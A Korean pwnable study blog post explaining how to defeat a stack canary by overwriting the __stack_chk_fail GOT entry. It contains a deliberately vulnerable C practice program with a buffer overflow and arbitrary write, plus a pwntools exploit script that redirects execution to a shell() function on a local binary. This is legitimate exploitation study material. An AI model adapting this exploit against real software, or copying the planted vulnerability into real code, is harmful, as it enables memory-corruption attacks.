---
title: "[PWNABLE] Canary_GOT Overwrite"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack S"
date: "2023-10-22"
translation_key: "tistory-be437eb64d47"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-CanaryGOT-Overwrite"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.** **※** 

**앞서 Canary기법과 우회하는 방법에 대해 포스팅을 했다,**

**[https://whrdud727.tistory.com/10](https://whrdud727.tistory.com/10)**

 [\[PWNABLE\] Canary\_설명

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SSP(Stack Smashing Protector) Stack buffer Overflow로부터 sfp와 ret를 보호하기 위한 기법으로, Stack의 canary라는 값을 이용하여 검증

whrdud727.tistory.com](https://whrdud727.tistory.com/10)

[https://whrdud727.tistory.com/11](https://whrdud727.tistory.com/11)

 [\[PWNABLE\] Canary 우회

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설

whrdud727.tistory.com](https://whrdud727.tistory.com/11)

우회 기법을 설명 중 공격 기법인 GOT Overwrite에 대한 지식이 필요한 부분이 있어 해당 부분을 남겨두었었는데

이번 게시글에서 설명을 해보겠다.

바이너리 파일 안에서 Canary가 변조되었는지 확인하는 함수를 '\_\_stack\_chk\_fail'함수라고 했었다.

해당 함수의 경우 다른 함수들과 마찬가지로 plt와 got를 이용하여 호출된다.

![](/assets/images/tistory/tistory-be437eb64d47/001.png)

어떤 식으로 접근해야할지 눈치를 챘을 것이다.

당연하게도 \_\_stack\_chk\_fail@got를 다른 함수의 주소로 덮어씌우면 우회가 가능하다.

간단한 예제를 하나 가지고 실습해보겠다.

```
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

int main(){
    unsigned long long addr = 0;
    char s[8];

    read(0,s,20);
    write(1,"Addr :",6);
    scanf("%lld", &addr);
    write(1,"Value :",7);
    scanf("%lld", (void *)addr);
    printf("Good Bye~ whrd");

    return 0;
}
```

첫 번째 입력에서 함수의 got 주소를 입력하고,

두 번째 입력에서 변경하고자 하는 함수의 주소를 입력하면 되는 간단한 예제이다.

pwntools의 기능을 이용하여 함수의 주소를 쉽게 구할수도 있겠지만

pwnable 공부 초반에서는 직접 보면서 하는것이 좋기 때문에 해당 방법을 기준으로 진행하겠다.

![](/assets/images/tistory/tistory-be437eb64d47/002.png)

특정 함수의 주소만 보면 되는 것이기 때문에 print 명령을 이용했지만,

info func를 이용하여 \_\_stack\_chk\_fail@plt 주소를 찾아도 된다.

다시 코드를 보면 셸을 실행시키는 shell()이라는 함수가 존재하는 것을 볼 수 있다.

마침 \_\_stack\_chk\_fail함수는 메인함수의 종료 직전에 실행되게 된다.

![](/assets/images/tistory/tistory-be437eb64d47/003.png)

\_\_stack\_chk\_fail@got를 shell()의 주소로 덮어쓴다면 셸을 바로 얻을 수 있을 것이다.

![](/assets/images/tistory/tistory-be437eb64d47/004.png)

이제 필요한 준비물들은 다 구해주었다.

이제 공격을 위한 페이로드를 작성해보겠다.

```
from pwn import*

p = process('./ex1')

shell= 0x4011d6
stack_fail = 0x403348
#shell = e.sym['shell']
#stack_fail = e.got['__stack_chk_fail']

p.send(b"a"*16)
p.sendlineafter(b":",str(stack_fail))
p.sendlineafter(b":",str(shell+4))

p.interactive()
```

위 페이로드를 실행하면 정상적으로 셸을 따진 것을 확인할 수 있다.

![](/assets/images/tistory/tistory-be437eb64d47/005.png)

GOT Overwrite 공격 전 got 상태

![](/assets/images/tistory/tistory-be437eb64d47/006.png)

 GOT Overwrite 공격 이후 got 상태

![](/assets/images/tistory/tistory-be437eb64d47/007.png)

정상적으로 값이 덮어씌워졌다.

Canary를 변조를 해주었기 때문에 main함수가 종료되면서 \_\_stack\_chk\_fail함수를 호출시킨다.

이때 해당 함수에는 우리가 shell이라는 함수의 주소로 씌워주었기 때문에 해당 주소가 들어있다.

즉, shell함수가 실행이 되면서 셸이 따지는 것이다.
